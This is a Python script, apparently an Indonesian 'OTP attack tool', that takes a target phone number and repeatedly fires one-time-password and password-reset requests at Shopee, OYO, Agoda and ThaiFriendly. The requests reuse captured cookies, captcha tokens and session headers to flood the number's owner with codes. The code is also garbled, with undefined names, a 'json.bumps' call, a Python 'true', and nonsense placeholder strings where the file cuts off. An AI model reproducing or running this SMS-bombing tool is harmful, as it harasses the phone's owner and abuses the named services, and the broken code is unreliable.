import sys
import subprocess

try:
    import requests
    import time
    import random
    import os
    import urllib3
    import json
    import bs4
    
except ImportError as e:
    print(f"error importing module:{e}")
    sys.exit(1)

finally:
    import requests
    import urllib3
    from bs4 import BeautifulSoup as bs

def banner():
    ascii_art = """ 
  ____  _________  ___  __  __           __  ______          __
 / __ \/_  __/ _ \/ _ |/ /_/ /____ _____/ /_/_  __/__  ___  / /
/ /_/ / / / / ___/ __ / __/ __/ _ `/ __/  '_// / / _ \/ _ \/ / 
\____/ /_/ /_/  /_/ |_\__/\__/\_,_/\__/_/\_\/_/  \___/\___/_/  
  
    """
    print(ascii_art)
    
from urllib3.exceptions import *
from bs4 import BeautifulSoup as bs
from requests import post,get

green   = "\033[1;92m"
white   = "\033[1;97m"
gray    = "\033[1;90m"
yellow  = "\033[1;93m"
purple  = "\033[1;95m"
red     = "\033[1;91m"
blue    = "\033[1;96m"

def typing(s):
    for c in s + "\n":
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0.050)
        
def countdown(time_sec):
        mins, secs = divmod(time_sec,60)
        timeformat = '\033[1;97m[\033[1;93m \033[1;97m] Please Wait For The Process \033 [1;92m{:02d}:{:02d}'.format(mins,secs)
        waktu = time.localtime()
        keterangan_jam     = time.strftime("%H:%M:%S", waktu)
        keterangan_tanggal = time.strftime("%d", waktu)
        keterangan_bulan   = time.strftime("%B", waktu)
        bulan_bulan        = {
            "January"      : 'Januari',
            "February"     : "Februari",
            "March"        : "Maret",
            "April"        : "April",
            "May"          : "Mei",
            "June"         : "Juni",
            "July"         : "Juli",
            "August"       : "Agustus",
            "September"    : "September",
            "October"      : "Oktober",
            "Novemebr"     : "November",
            "December"     : "Desember"
            }
        bulan     = bulan_bulan.get(keterangan_bulan)
        tahun     = time.strftime("%Y", waktu)
        hari      = time.strftime("%A", waktu)
        hari_hari = {
            "Sunday"       : 'Minggu',
            "Monday"       : "Senin",
            "Tuesday"      : "Selasa",
            "Wednesday"    : "Rabu",
            "Thursday"     : "Kamis",
            "Friday"       : "Jumat",
            "Saturday"     : "Sabtu"
        }
        hari = hari_hari.get(keterangan_hari)
        print(f"{timeformat} | {blue} {hari}, {keterangan_tanggal} {keterangan_jam}", end='\r')
        time.sleep(1)
        time_sec -= 1
        
def tanya(nomor):
    check_imput = 0
    while check_imput == 0:
        a = input (f"""{red}Eant To Redo The Tools? Y/N {white} Your Input: {green}""")
        if a == "y" or a == "Y":
            check_imput = 1
            start(nomor, 1)
            break
        elif a == "n" or a == "N":
            check_imput = 1
            typing(f"{green}Exit The Tools")
            sys.exit()
            break
        else:
            print ("Enter the Command Correctly!!")
            sys.exit

def jam(nomor):
    typing("program Runing")
    b = nomor[1:12]
    c = "62" + b
    rto = 0
    RTO_flag = 0
    for _ in range(10):
        try:
            Thai_friendly    =  requests.post("https://www.thaifriendly.com/nt/app.php",headers={'user-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36'},data={'z':'phonelogingetpin','country':'62','number':b,'ppclienttoken':'igq39qdc9rwk2ax1zrgdq'})
            Shopee           =  requests.post("https://shopee.co.id/api/v4/otp/send_vcode", data=({"phone":c,"force_channel":true,"m_token":"","captcha_signature":"f349b8da10df0968417bcd8ae861cbdf9646f310f56e5b9768de9d4256e2e7f64151ca55b370efcf26fcbc6186b5cb084d106362e49a2a8aaf41b91ab3d356b5bcd54ef1e3fb3577d2cf40fe0358d6ca5887497a4647fc9e5f183c283193767058a6b781f26ac6e78cbc0766f4201d67bdf2134affc498896e796bb52413721b429bd7ce55e23cd19d9fd7d59184cf2c31abdf530dc89673978f060befc344d5d29298e4563389aa4883e7ec222422575cf4ade0dc36e3e356721a4fa769f7defe6040c7d4eb29c81889e8cc38c92f70f1204e1e81908c16c34e5af303e3c5ac7f5950e0bd27cb5380e804d017f2ddbd66959a4541220ebd9c422fa89da31db36ad25df7ecf96c8f92c809386dfb962478abb9bd29431cc33d84402dd2012532b86fa6d39a606ffdb3f5048813e8e76e5110e28f76bfc506255a5d867aa13637e6d674b2905a2c41368f500b58aed32c4318de71bbfed61c3f28662651c71ba09a877513cbc17e9242e57ae6e733f20a769dab1d2c69fef9fd28fbdc08eff36bdc9f95b08eeb9229edd01cefe57d088f37ecba15595f53f532c0a83b28030e91f30c7f09b33e5374f1f96604bd5253d384bdf0915289a28d181c403f03146e3cec806ee3d58cddfdb12ade88aca0ae0ac23e676e01ad0299b84dc668104dfc5835482e6b1477e69a7b","operation":14,"channel":3,"supported_channels":[1,2,3,6,0,5],"support_session":"true"}), headers={"Host": "shopee.co.id", "cookie": "_gcl_au=1.1.1335692303.1723146463", "cookie": "_QPWSDCXHZQA=22eb82b0-bbef-4af5-8fa7-a32aa82861f1", "cookie": "REC7iLP4Q=a7bf8b1c-2c16-491e-9734-8da0e92ac381", "cookie": "SPC_R_T_IV=YzNXb3pNWnBoendOVDFKYw==", "cookie": "SPC_T_ID=fQFcrTnFuKwefaCfJvEb/voAmAYIxT+ho26MZ4lyjWlDx35LkTvxqTCRhuEyqjLRdlxvtJNAxkml4PwC5nlthehvdTftJcZfaCusY9EIzyD4fY7xDUEvTsIQ1d4Xg5/cTTbpq9FIBwppMZ5bumdVXw/TdBcPVrYKsGa7mLHGrK0=", "cookie": "SPC_T_IV=YzNXb3pNWnBoendOVDFKYw==", "cookie": "SPC_SI=tGWfZgAAAABMQ09TYUYxcJjLaAIAAAAAbWtER0tNUmY=", "cookie": "SPC_SEC_SI=v1-eFdwbGlvQk9XbVU2U2RSRuLTX2nh9oS19jScd+QbY5t30PSl8zeouiXRZ9T9mhWVvLN53J0ASx/JYxzuR89Z53cQPVqApNpRHFKIxMGbH9M=", "cookie": "SPC_F=9A4KaQ4S2Rmmfr8AnGDpk7gDLZFaRr9O", "cookie": "REC_T_ID=145ff317-55bf-11ef-b47e-d24904d76d37", "cookie": "SPC_R_T_ID=fQFcrTnFuKwefaCfJvEb/voAmAYIxT+ho26MZ4lyjWlDx35LkTvxqTCRhuEyqjLRdlxvtJNAxkml4PwC5nlthehvdTftJcZfaCusY9EIzyD4fY7xDUEvTsIQ1d4Xg5/cTTbpq9FIBwppMZ5bumdVXw/TdBcPVrYKsGa7mLHGrK0=", "cookie": "_fbp=fb.2.1723146465059.55087184451892152", "cookie": "__LOCALE__null=ID", "cookie":"csrftoken=DgPiGgYOiTI3kxB0Dce6RNgrxrsH4fIS", "cookie": "shopee_webUnique_ccd=L98m8X5IwkSQNXtZMTas1Q%3D%3D%7CYbvT6UTyg8iQJ8Nf8XipvoiA%2BqScg%2Blmi3TvD%2FGl8u%2BfN13wWInRqrfgsPBHVPM7s%2B90D2Iv31BW5DU%3D%7C9QhAaiTogBs50RyP%7C08%7C3", "cookie": "ds=de0ad0abc6dc799ea2c6f45354dbc6f0", "cookie": "_sapid=13b674d6f396c1b016ebb8d4c38ff8a434433e659449294dcf139ccf", "cookie": "AMP_TOKEN=%24NOT_FOUND", "cookie": "_ga=GA1.3.1292621396.1723184246", "cookie": "_gid=GA1.3.1005203515.1723184247", "cookie": "_ga_SW6D8G0HXK=GS1.1.1723184245.1.1.1723184330.60.0.0", "content-length": "1145", "sec-ch-ua":'"Chromium";v="123", "Not:A-Brand";v="8"', "X-Sap-Sec": "LyioF7xRJAd5abARbmzRbxHRbmj5bmpRZmzNbY5RPJlXbYzRIJlbbwAR5mlpbCRRoJlPbCXRpmlKbG5RemlNbGbRHFmtba5RMmmXbazRQJmGbbRRdmmzbxpRLmmObxzR/mm/bZRR7mmcbZzRWmyVbiuR9myAbj5RFmyfbjzRnmyEbf6RtFyrbfzRvmy6bguRVmzubyRRiJz8byARjJzwbz2RmmzfbzzRCmzHblARKczRbi5QbmyXbczRbmzRO/Rcbmz28S7HCmwRbY5cbmyRbJzRbmzRACDwbYECI0JvbmzRCXI+HbGR90kP+mbRbbRcbmzRbmysqmwRbzAQbmz7sj0t7TxOLclmAcjV4SxP4yRLfJzRbZNXbczRmmwRbl5QbmyKgFzTrmbRbwSZ5MaXXpS0WmzRbwWabyMyXhk7HmbRbmzRbZyAbmzRbmzRtpAdbmywbczR4mjRbmzRHk4NaZ4lbmmRfkzcbmyEaD7IbGQi8DxSfTI94QyF1/XR0kAcbmzRRmNdQ7Spx/Uk8iTRbczR9mbRbY+76a6Rbmz7djFGYDzcbmzRbmysC8zXTcARbmz5o1KqXmjRbfX05ktMNJofoR1C/iq1XTaE47nCugHcRl8Cs97OkvCp1RYzf0AwtO2b5paw4LfLZprpW8OY7g8SVrd+0QW7/HJD9MSDhp2hc+F5h4zBk9XM4WpddDW55CK2S2tZjN8U8E/uMmO4RmEdk1wKZuxIZ+IMC7AdhxCbP/g5O7uvCILotMRkSfP4wAa+lQwp0jdgiRKaTl8kmg1EKoSPGc+6hZM4qUQDjmJRTfZZwKA2kaJylrVCDlll/qdb0nKJk6FkUuAMIw1Xu2D92tQx1TmLPaBld45btHC0Mp0AYUCXOLByF8yEtjf+rDd1qpoSTGSIYSNvc7whCMWGoYSr8TtBx/zuDo4Dkgjax2lzMwN4u3H3UFz2YpenzTvLCuqbbUjv6dDYJwBaYZjE/Sr8DzbQ3BYHsQXrb6Gz7x3p8Njvn3ZB0pnlWGb9Dq5dREf/bym3IfafeqpwYQRyl2GPINf3R00387qWaqOmkDnDbLDz2f3namzRbYMw29HNbmzR3HP4WcRRbmygiTz9TyXFAFzRbmz6bmzR7qQIL185GiHVbmzRiGdULQGiWgdlezge1HyUvdD0WtSMc943TLRzeMZa8868E5JsYoAGU4IKlxXPcz5eT/raKIOF8IRRbmzRbmzRbmzRbmzKbmzRiG2x6Q8zmWzWeRccYVbbbmARbmya2NE7bmzRbmARbml+2vMLamzRbgY+LebNbmzRgMgE6cRRbmy5PQdkYY3wqcRRbmzTTjAVgXV8AFzRbmz6bmzRaq2HQzF4GiHNbmzRfBPycFbRbmzUnFzRbczRbykobmzNbmzRfBPycFRRbmyygXXTgXXXTFzRbmz6bmzRJIs7B6IzAlVNbmzRfc3AFmwRbmlcVSXRZmzRbyVViTyji4w9bmzRbC==", "Sec-Ch-Ua-Mobile": "?0", "X-Sz-Sdk-Version": "1.10.9", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36", "X-Api-Source": "pc", "X-Sap-Ri": "feb4b566df64016487f55c3204017e2b002565ec017927c8774e", "Accept": "application/json", "Content-Type": "application/json", "X-Shopee-Language": "id", "X-Requested-With": "XMLHttpRequest", "Af-Ac-Enc-Dat": "a04b46c8f6fe8504", "X-Csrftoken": "DgPiGgYOiTI3kxB0Dce6RNgrxrsH4fIS", "Af-Ac-Enc-Sz-Token": "L98m8X5IwkSQNXtZMTas1Q==|YbvT6UTyg8iQJ8Nf8XipvoiA+qScg+lmi3TvD/Gl8u+fN13wWInRqrfgsPBHVPM7s+90D2Iv31BW5DU=|9QhAaiTogBs50RyP|08|3", "Sec-Ch-Ua-Platform": "Linux", "Origin": "https://shopee.co.id", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty", "Referer": "https://shopee.co.id/buyer/login/otp", "Accept-Encodin": "gzip, deflate, br","Accept-Languag": "en-US,en;q=0.9", "Priority": "u=1, i"})
            oyo_indian       =  requests.post("https://identity-gateway.oyorooms.com/api/pwa/generateotp?locale=en", data=json.bumps({"phone":b,"country_code":"+62","nod":4}), headers={"Host": "identity-gateway.oyorooms.com", "Cookie": "AMP_TOKEN=%24NOT_FOUND; _gid=GA1.2.745773908.1723193844; _gcl_au=1.1.1196284378.1723193844; _csrf=gNjMqHCuUGa4OQ7Z2giD7l7b; acc=IN; X-Location=undefined; mab=31f18afde04f34a263cf4262cfaa7a0b; expd=mww2%3A1%7Cioab%3A0%7Cmhdp%3A1%7Cbcrp%3A1%7Cpwbs%3A1%7Cslin%3A1%7Chsdm%3A2%7Ccomp%3A0%7Cnrmp%3A1%7Cnhyw%3A1%7Cppsi%3A0%7Cgcer%3A1%7Crecs%3A1%7Clvhm%3A1%7Cgmbr%3A1%7Cyolo%3A1%7Crcta%3A1%7Ccbot%3A1%7Cotpv%3A1%7Cndbp%3A0%7Cmapu%3A1%7Cnclc%3A1%7Cdwsl%3A1%7Ceopt%3A1%7Cotpv%3A1%7Cwizi%3A1%7Cmorr%3A1%7Cyopb%3A0%7CTTP%3A1%7Caimw%3A1%7Chdpn%3A0%7Cweb2%3A0%7Clog2%3A0%7Clog2%3A0%7Cugce%3A0%7Cltvr%3A1%7Chwiz%3A0%7Cwizz%3A1%7Clpcp%3A1%7Cclhp%3A0%7Cprwt%3A0%7Ccbhd%3A0%7Cins2%3A3%7Cmhdc%3A1%7Clopo%3A1%7Cptax%3A1%7Ciiat%3A0%7Cpbnb%3A0%7Cror2%3A1%7Csovb%3A1%7Cqupi%3A0%7Cnbi1%3A3%7Crwtg%3A1%7Cstow%3A1%7Cimtg%3A2; appData=%7B%22userData%22%3A%7B%22isLoggedIn%22%3Afalse%7D%7D; token=dUxaRnA5NWJyWFlQYkpQNnEtemo6bzdvX01KLUNFbnRyS3hfdEgyLUE%3D; _uid=Not%20logged%20in; fingerprint2=fa56e6bdbd78cb42a7f42292a12d7725; tvc_utm_source=(direct); tvc_utm_medium=(none); tvc_utm_campaign=(not set); tvc_utm_key=(not set); tvc_utm_content=(not set); XSRF-TOKEN=vftM9zMn-7sFuvjR99LCbPlljkwXdZIu15wM; _ga=GA1.1.204083261.1723193842; _gat=1; _ga_589V9TZFMV=GS1.1.1723193842.1.1.1723194857.26.0.1040289085", "Content-Length": "52", "Deviceid": "fa56e6bdbd78cb42a7f42292a12d7725857528", "Sec-Ch-Ua": '"Chromium";v="123", "Not:A-Brand";v="8"', "Sec-Ch-Ua-Mobile": "?0", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36", "Sdata": "eyJrdWQiOls1NDgwMCwxMjU0MDAsMjA5NzAwLDY1NzAwLDEyMDUwMCw5MDUwMCw4MDgwMCwxMTU4MDAsOTU3MDAsNzAwMDAsNzk0MDBdLCJhY2MiOltdLCJneXIiOltdLCJ0dWQiOltdLCJ0aWQiOltdLCJraWQiOls4Mjc1Nzk5Ljk5OTk5OTk5OSwyNTM2ODAwLDI3MjA1MDAsMTIxMDkwMCwzMjc2MDAsMjAzMzAwLDE4MzcwMCwyMDgzMDAsMTQzNjAwLDI0MzkwMCwyNjkxMDBdLCJ0bXYiOltdfQ==", "Loc": "223", "Content-Type": "text/plain;charset=UTF-8","Externalheaders": "[object Object]", "Xsrf-Token": "vftM9zMn-7sFuvjR99LCbPlljkwXdZIu15wM", "Sec-Ch-Ua-Platform": "Linux", "Accept": "*/*", "Origin": "https://identity-gateway.oyorooms.com", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty", "Referer": "https://identity-gateway.oyorooms.com/login/?country=&retUrl=/", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "en-US,en;q=0.9", "Priority": "u=1, i"})
            agoda            =  requests.post("https://www.agoda.com/id-id/ul/login/forgetpassword/phone?appId=dictator", data=({"credentials":{"username": c,"authType":"phone"},"captchaVerifyInfo":{"captchaResult":{"recaptchaToken":"03AFcWeA59gCX5ObkErQRW1gVOs_xjXDK2_Kd1pdc4TIy1zY0YDEVjAi9BkuK1wqTuFY49QcRcDMK_vbn5IZqxITCbAxVZzUgRBEpeTYvNn_WGopJ52C5_wqj8ZOdeVk8WjGFLSJHbDqznH8jnmVRa1d__3LOWRRCCKbaQXT3aCNlrE6awl5zTNzERv3QhQ-2jn_FSfDMua2Y7mCtN_Fssy89K2fKE3-391jUEnodpup9OGrie40R8CgQlZmx2Ik-Yqf5JJj2_Oypo0rDVIpzAXDGE0m4jBwnSSwE6ZQw6--47aQOKwm4tvoAProMriDJXkqN-RhKe3SgxOGnTjqwOFQHHhubqbIVibdGkyECHLsLoPv2dnvrVg9f-wPhbAGCiwmlSl21fQzuDFPe_UX_5jk-mewJ3COT5IyZxW0wgEtq8Lo-Fe944GbxyLCbyW2EtRRvx9TkUTnRBdY-mfsTSpuxssWTbzwxNrpUVb3LNtt2mle8KZt_uWMtQAU91e0_F3Ko0_97IT8cvz_jVg29y_3PyoSoDzhz4anGF1lsYKi5Ui5_MzISS7dFemkYvQkQOsirItmCacPuc55owjhvzPiMDmxd0ToUYDhgpn8919lfSC7YKzgxDadUJc3QjcsDMksDh4HGKeY6DQGW3hssVXFmp4P0vchtr28zQC2sAg20YYG5z5Nzua6ZVbFm0Ewzi9-lbQLuh4JjLGNkBrJ_06KqBWu-KHgP7jWwnxeo85E1E9buv2PX8cBkTKwldRPW_x5WUNZXK5SttEzR8rySTUNADGcWwqLwUU8muIaB0bQpxsFbUIr3MP3Hl9RX9rDcWpqGynPyJQZGkMHx9ed8INAhSvufmNSRhojphj9f9XzZ1eH66nL9k0QWhMgwkm2Gijg1B1zgemchcwl-dzmj1VbGZ9OdVDWZ4GfeYsQhEqe8ju_s3w1eFaCqQrWmIyZOhTNrfdoWFoRbObOQBOhyfLEzSdLgmXl0r8NhlWq2N6q922GsIkksqvh3ICJz09OlGMb1hvqan7ceCC7kCoK9YvLH-kZPXGlpibAqu5fiX0WCcl2pm2oyVAeJCci8ck3tAb32QWA4T1H_E5sU1l3UD1an_Sm9QBpXB0OdaYbuvA-kaV2OrS39_nYOQeCnpRaUzJaVuzwnd1vQscXCOuHQglA2sJ7cRbE6Oi-j-ZgxAcDk1af9SBq0C0fHhrFzOZsdoOz4_CYl29SJYnBSwHt4uK3OljT3jXTt1yFQboi3x-c7wZ_Wjy3RKTe7FQus7ejXP9-zmiHcUpo9pzVTJkfe3Hz8VN6YLrntMPiU14nwSKUSNt3IQJi8LiYwz6SV5Pso61Obok6jQ7NYSRrcVAeti5zM9Ghekm3xo7BPg7BYosdPUGcYFFTHXAeeyNVzFdAAPlCINDqwnucAGYeMe3RW_mVeDUyH4-zgwAT2mwceq5wyv4afa8ROghSu8w7_ImnlkWmhF1No428T91_f-N9eLYkXs7WmdxwsyOKQj5kt8AYmeZBA3UBQ373PZpuyUWmnvOMT8WriBEcXuA6tE7XqbljtuytlA3oClF3sWSNWLfbrZc0RQzzjNKM36qF-P5i-A1_clEGFxXNsDvKZn3kmN_7Ph4k6Q2prvSqj_-MZRyd5oEQbYCFguVx-gVSDiSdsQwd8q4nRtzmJfWjf5ceXfYNhGkEDHVoi8GG2Jx35I0rbxJkvMg9DIcWhh84k7ineCtje_m-ZTrjYXb2a_dR-ZDQVb2s-epnQSBBJ_f4PZJTmmo4zkn_LJ8QRUoDivLyq5VG73RtwLJdwPVo0Q13_BvZyaP_F-AXFJhRJZ2endrkxuRHR8GB621UFzVJzTsCEcNasvkraUhY6TW30xeAuEoXCGixgVx7SalfFJSTXP2VXbuMkZjE1qO_baoI6tfvXNldDPXC4OYMMkFgLPudIilw17j_JnXg5IaTnd3IU5FDmD75xf5ITI0W1j3rzkh4gTk089ABq7Y4Ub8hqv9C0uBocTX6-LhJCZsy1_tRwfqTL7E52DOH4DLeVEP6J2A3UeJ1Y3BQd8XjjtOBX3lpquVYKt5751Qnr-yEtm7hoDAXW70dipzYa1qw9Hw6wIHw09hWgzVlfGWAUQePkySrYIMbGrFZRwsCzHQzay9wrg4ZbRabz-a787G2qIw4naC8kn9qQ6Yu2b6cCmx0hQ3_RlLtO6I3r1s2-lPFZYTOprTYfvHWT5GMbfWtJ0B2-bHnS6B-iGsqeTTUGgB7xkUv8o1C3QBXHkWwBpPumOSwIH6eSIc_G56OQR0REQByrRR1I96ay1pvw2YLBTqkOCdR0NHk_nj-AcyraoRNVwglEd3HA107omnYQVQYM"},"captchaType":"recaptcha"}}), headers={"Host": "www.agoda.com", "Cookie": '"agoda.firstclicks=1922884||6da0c587-ac74-45f1-9a0a-d908d27c6f8d||2024-08-09T16:51:20||qrarlsizrqw53x2hxqqjterw||{"IsPaid":true,"gclid":"","Type":""}; agoda.user.03=UserId=1236221d-964c-4b1b-ae03-678c9e655f5e; ASP.NET_SessionId=qrarlsizrqw53x2hxqqjterw; agoda.prius=PriusID=0&PointsMaxTraffic=Agoda; agoda.landings=1922884|6da0c587-ac74-45f1-9a0a-d908d27c6f8d||qrarlsizrqw53x2hxqqjterw|2024-08-09T16:51:20|True|19----1922884|6da0c587-ac74-45f1-9a0a-d908d27c6f8d|EAIaIQobChMI88Ozq9HnhwMVIoJLBR3_dA5QEAAYASAAEgLnqvD_BwE|qrarlsizrqw53x2hxqqjterw|2024-08-09T16:51:21|True|20----1922884|6da0c587-ac74-45f1-9a0a-d908d27c6f8d|EAIaIQobChMI88Ozq9HnhwMVIoJLBR3_dA5QEAAYASAAEgLnqvD_BwE|qrarlsizrqw53x2hxqqjterw|2024-08-09T16:51:21|True|99; agoda.lastclicks=1922884||6da0c587-ac74-45f1-9a0a-d908d27c6f8d||2024-08-09T16:51:21||qrarlsizrqw53x2hxqqjterw||{"IsPaid":true,"gclid":"EAIaIQobChMI88Ozq9HnhwMVIoJLBR3_dA5QEAAYASAAEgLnqvD_BwE","Type":""}; agoda.attr.03=ATItems=1922884$08-09-2024 16:51$6da0c587-ac74-45f1-9a0a-d908d27c6f8d; agoda.price.01=PriceView=1; xsrf_token=CfDJ8Dkuqwv-0VhLoFfD8dw7lYxltVZs-7jaXhk_DA-IBmXNuOeY5hYSI4Z-86Y8g3yqQnYDXh1E4pS7hyZcqQ4mNVgwt9vbQFFTKQxlEl7C9GFjpLhIALkUr2MlRliukaV_W13xFkUS7vd7OMzztXRXMOI; tealiumEnable=true; _ab50group=GroupB; _40-40-20Split=Group20; agoda.consent=ID||2024-08-09 09:51:37Z; ab.storage.userId.d999de98-30bc-4346-8124-a15900a101ae=%7B%22g%22%3A%221236221d-964c-4b1b-ae03-678c9e655f5e%22%2C%22c%22%3A1723197159335%2C%22l%22%3A1723197159349%7D; ab.storage.deviceId.d999de98-30bc-4346-8124-a15900a101ae=%7B%22g%22%3A%22ee688ed1-8868-d16d-f833-873cbb9b8597%22%2C%22c%22%3A1723197161071%2C%22l%22%3A1723197161071%7D; _gcl_au=1.1.1712548103.1723197182; _gcl_aw=GCL.1723197265.EAIaIQobChMI88Ozq9HnhwMVIoJLBR3_dA5QEAAYASAAEgLnqvD_BwE; FPID=FPID2.2.DUIPFnhnJ6vUyYi520COeBzhpSFzW4UrAD7x2vC3ZfU%3D.1723197265; FPLC=K4NzHhRbNJtFtw7h1xeoUrG%2Fjzuox3Xbwh%2FwOhSJ0mCHr%2BQRiEFyYYUgN3bF2IQS9B9JgZVkTHFYC01F%2Fi2sW5ywiwTQYcngfI6DHpGMjxIgLCKyJbMqK%2BQ9Ip8adA%3D%3D; _ha_aw=GCL.1723197271.EAIaIQobChMI88Ozq9HnhwMVIoJLBR3_dA5QEAAYASAAEgLnqvD_BwE; _hab_aw=GCL.1723197272.EAIaIQobChMI88Ozq9HnhwMVIoJLBR3_dA5QEAAYASAAEgLnqvD_BwE; _ga=GA1.2.404318706.1723197265; _gid=GA1.2.2000553743.1723197272; _gac_UA-6446424-30=1.1723197272.EAIaIQobChMI88Ozq9HnhwMVIoJLBR3_dA5QEAAYASAAEgLnqvD_BwE; ab.storage.sessionId.d999de98-30bc-4346-8124-a15900a101ae=%7B%22g%22%3A%2209ad5cdf-ec8b-7c51-563d-9b66d0fee0d4%22%2C%22e%22%3A1723199088924%2C%22c%22%3A1723197160257%2C%22l%22%3A1723197288924%7D; _fbp=fb.1.1723197339748.27399109579882052; agoda.version.03=CookieId=4cfb2770-7859-47fb-a2c4-49bd96cab3df&DLang=id-id&CurLabel=IDR; _ga_T408Z268D2=GS1.1.1723197264.1.1.1723197344.0.0.1615162795; ul.session=ec6abb07-19dc-4042-950f-6a253937cf0d; utag_main=v_id:0191368cff6800037f3aa50e5a3702074011506c00bc1$_sn:1$_se:3$_ss:0$_st:1723199263606$ses_id:1723197095797%3Bexp-session$_pn:2%3Bexp-session; _uetsid=6d44e790563511ef8449071d97d15f3e; _uetvid=6d544200563511ef9db11b2a4ba16d65; _ga_C07L4VP9DZ=GS1.2.1723197343.1.1.1723197465.59.0.0; rskxRunCookie=0; rCookie=sfwuk34ev3swqba5znkq8lzmja1uk; lastRskxRun=1723197465327; ftr_ncd=6; forterToken=0fcbff9ba56d4f05aa53323124864c9f_1723197463568__UDF43-m4_9ck_; agoda.analytics=Id=-581019470964087794&Signature=-7234020126026272793&Expiry=1723201150066"', "Content-Length": "2511", "Sec-Ch-Ua": '"Chromium";v="123", "Not:A-Brand";v="8"', "Ag-Request-Id": "2f34c76f-f742-462e-988c-cdfe477d8fef", "Sec-Ch-Ua-Mobile": "?0", "Ul-Fallback-Origin": "https://www.agoda.com", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36", "Content-Type": "application/json; charset=utf-8", "Ul-App-Id": "dictator", "Ag-Initiator-Version": "mock-appVersion",  "Sec-Ch-Ua-Platform": "Linux", "Accept": "*/*", "Origin": "https://www.agoda.com", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty", "Referer": "https://www.agoda.com/id-id/ul/login/forgetpassword/phone?appId=dictator", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "en-US,en;q=0.9", "Priority": "u=1, i"})
            
            
            
            
          
            
            
            
            
            
            
            
            
            
            
            
            
            
            
            
            
            
            
            typing(f"Successful OTP Sending")
            countdown(120)
        except requests.exceptions.ConnectionError:
            if RTO_flag == 0:
                print("")
                typing("dfsdfs")
                print(f"daksjd")